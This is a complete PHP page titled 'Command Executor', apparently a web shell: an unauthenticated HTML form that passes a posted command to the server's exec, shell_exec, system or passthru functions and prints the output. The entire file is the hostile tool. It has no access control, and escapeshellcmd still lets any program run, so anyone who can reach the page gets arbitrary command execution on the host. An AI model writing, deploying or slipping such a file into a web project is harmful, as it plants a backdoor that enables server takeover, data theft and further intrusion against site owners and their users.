<?php
$output = '';
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['command']) && isset($_POST['function'])) {
    $command = escapeshellcmd($_POST['command']);
    $function = $_POST['function'];
    
    switch ($function) {
        case 'exec':
            exec($command, $output);
            $output = implode("\n", $output);
            break;
        case 'shell_exec':
            $output = shell_exec($command);
            break;
        case 'system':
            ob_start();
            system($command);
            $output = ob_get_clean();
            break;
        case 'passthru':
            ob_start();
            passthru($command);
            $output = ob_get_clean();
            break;
        default:
            $output = 'Invalid function selected.';
            break;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Command Executor</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            text-align: center;
            margin-bottom: 20px;
            width: 80%;
            max-width: 600px;
        }
        h1 {
            margin-bottom: 20px;
        }
        input[type="text"] {
            width: 80%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        .buttons {
            margin-bottom: 20px;
        }
        .buttons label {
            margin-right: 20px;
        }
        .output-container {
            max-height: 300px; /* Limit the height for the output container */
            overflow-y: auto; /* Enable vertical scrolling */
            background-color: #333;
            color: #f4f4f4;
            padding: 20px;
            border-radius: 5px;
            text-align: left;
            white-space: pre-wrap;
        }
        button {
            background-color: #3498db;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #2980b9;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Execute a Command</h1>
        <form method="post">
            <input type="text" name="command" placeholder="Enter your command" required>
            <div class="buttons">
                <label><input type="radio" name="function" value="exec" required> exec</label>
                <label><input type="radio" name="function" value="shell_exec"> shell_exec</label>
                <label><input type="radio" name="function" value="system"> system</label>
                <label><input type="radio" name="function" value="passthru"> passthru</label>
            </div>
            <button type="submit">Run Command</button>
        </form>
        <?php if (!empty($output)): ?>
            <div class="output-container"><?php echo htmlspecialchars($output); ?></div>
        <?php endif; ?>
    </div>
</body>
</html>
